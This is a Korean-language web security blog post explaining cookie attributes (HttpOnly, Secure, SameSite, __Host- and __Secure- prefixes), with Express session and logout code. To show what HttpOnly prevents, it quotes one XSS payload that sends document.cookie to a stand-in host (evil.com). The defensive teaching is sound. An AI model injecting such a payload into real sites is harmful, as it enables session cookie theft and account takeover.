---
title: "쿠키 보안 — HttpOnly·Secure·SameSite·__Host 접두사"
description: "HttpOnly로 XSS 쿠키 탈취 차단, Secure로 네트워크 도청 방지, SameSite로 CSRF 방어, __Host-·__Secure- 접두사로 쿠키 고정 공격 방어하는 실전 설정을 정리합니다."
author: "PALDYN Team"
pubDate: "2026-05-22"
archiveOrder: 6
type: "knowledge"
category: "JavaScript"
tags: ["JavaScript", "보안", "쿠키", "HttpOnly", "Secure", "SameSite", "CSRF", "XSS방어"]
featured: false
draft: false
---

[지난 글](/posts/sec-sri/)에서 외부 리소스 무결성을 검증하는 SRI를 살펴봤습니다. 이번에는 인증과 세션 관리의 핵심인 **쿠키 보안 속성**을 자세히 정리합니다.

## 쿠키가 위험한 이유

쿠키는 브라우저가 서버로 요청을 보낼 때 **자동으로 포함**시킵니다. 이 편의성이 동시에 주요 공격 벡터가 됩니다.

- **XSS**: 공격자가 `document.cookie`로 세션 쿠키를 탈취해 계정을 빼앗음
- **CSRF**: 공격자 사이트가 요청을 보낼 때 쿠키가 자동 첨부되어 피해자 권한으로 실행됨
- **네트워크 도청**: HTTP 구간에서 쿠키가 그대로 노출됨
- **쿠키 고정(Session Fixation)**: 공격자가 서브도메인에서 상위 도메인 쿠키를 덮어씀

각 보안 속성이 이 중 어떤 공격을 막는지 이해하는 것이 핵심입니다.

## 보안 속성 상세

![쿠키 보안 속성 한눈에 보기](/assets/posts/sec-cookies-httponly-secure-attrs.svg)

### HttpOnly

`HttpOnly` 속성이 있는 쿠키는 JavaScript에서 `document.cookie`로 읽거나 쓸 수 없습니다. 브라우저가 HTTP 요청에만 첨부합니다.

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

XSS 공격자가 `<script>document.location='https://evil.com?c='+document.cookie</script>`를 심어도, `HttpOnly` 쿠키는 탈취되지 않습니다. 세션 쿠키·인증 토큰에 반드시 설정해야 합니다.

단, CSRF 토큰은 JavaScript가 읽어서 요청 헤더에 포함시켜야 하므로 `HttpOnly`를 붙이면 안 됩니다.

### Secure

`Secure` 쿠키는 HTTPS 연결에서만 전송됩니다. HTTP 요청에는 포함되지 않습니다.

```http
Set-Cookie: sessionId=abc123; Secure
```

공개 Wi-Fi 같은 환경에서 HTTP 트래픽을 도청해도 쿠키를 가로챌 수 없습니다. 프로덕션 환경에서는 항상 설정해야 합니다. 개발 환경(`localhost`)은 HTTPS가 아니더라도 `Secure` 없이 동작하도록 환경 분기를 사용합니다.

### SameSite

`SameSite`는 크로스 사이트 요청에 쿠키를 포함할지 결정합니다. CSRF 방어의 핵심입니다. 세 가지 값과 사용 기준은 앞선 CSRF 글에서 자세히 다뤘습니다. 세션 쿠키는 `Strict`를, 외부 링크로 유입되는 사이트는 `Lax`를 씁니다.

### __Host- 접두사 (최강 잠금)

쿠키 이름이 `__Host-`로 시작하면 브라우저가 강제 조건을 요구합니다.

1. `Secure` 속성 필수
2. `Domain` 속성 없어야 함(현재 도메인에만 묶임)
3. `Path=/` 이어야 함

```http
Set-Cookie: __Host-session=xyz; Secure; Path=/; SameSite=Strict
```

`Domain`이 없으면 `sub.example.com`이 `example.com` 쿠키를 설정할 수 없어 **쿠키 고정 공격**이 차단됩니다. 가장 안전한 세션 쿠키 설정 방식입니다.

### __Secure- 접두사

`__Host-`보다 약한 변형입니다. `Secure` 속성이 없으면 브라우저가 쿠키 설정 자체를 거부합니다. HTTP에서 실수로 민감한 쿠키를 설정하는 것을 방지합니다.

```http
Set-Cookie: __Secure-csrfToken=xyz; Secure; SameSite=Strict
```

## Express 구현

![Express 쿠키 보안 설정](/assets/posts/sec-cookies-httponly-secure-code.svg)

```js
import cookieParser from 'cookie-parser';
import session from 'express-session';

app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: '__Host-session',       // 쿠키 고정 방어
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000,  // 24시간
  },
}));
```

`express-session`은 `name` 옵션을 `__Host-` 접두사로 설정하는 것을 지원합니다.

## 쿠키 만료와 삭제

세션 쿠키(`Expires`/`Max-Age` 없음)는 브라우저를 닫으면 삭제됩니다. `Max-Age`를 설정하면 지속 쿠키가 됩니다.

로그아웃 시 서버에서 세션을 무효화하고, 같은 속성으로 `maxAge: 0`을 보내 쿠키를 만료시켜야 합니다. 속성이 달라지면 다른 쿠키로 인식해 기존 쿠키가 남을 수 있습니다.

```js
// 로그아웃 처리
app.post('/logout', (req, res) => {
  req.session.destroy();
  res.clearCookie('__Host-session', {
    path: '/',
    secure: true,
    sameSite: 'strict',
  });
  res.redirect('/login');
});
```

## 브라우저 쿠키 검사

DevTools → Application → Cookies 탭에서 각 속성을 확인할 수 있습니다. `HttpOnly` 열과 `Secure` 열에 체크 표시가 있어야 합니다. `SameSite`는 값이 표시됩니다.

## 보안 속성 체크리스트

| 속성 | 세션 쿠키 | CSRF 토큰 | 분석/광고 쿠키 |
|---|---|---|---|
| `HttpOnly` | ✅ 필수 | ❌ JS 읽어야 함 | 선택 |
| `Secure` | ✅ 필수 | ✅ 필수 | 권장 |
| `SameSite=Strict` | ✅ 권장 | ✅ 권장 | `Lax` 가능 |
| `__Host-` 접두사 | ✅ 권장 | 선택 | 불필요 |

## 정리

쿠키 보안 속성은 각각 다른 공격을 방어합니다. `HttpOnly`로 XSS 탈취를, `Secure`로 네트워크 도청을, `SameSite`로 CSRF를, `__Host-` 접두사로 쿠키 고정 공격을 막습니다. 세션 쿠키에는 이 네 가지를 모두 적용하는 것이 최선입니다. 다음 글에서는 JWT의 저장 위치와 보안 트레이드오프를 살펴봅니다.

---

**지난 글:** [SRI — 서브리소스 무결성 검증](/posts/sec-sri/)

**다음 글:** [JWT 저장 전략 — localStorage vs HttpOnly 쿠키](/posts/sec-jwt-storage/)

<br>
읽어주셔서 감사합니다. 😊
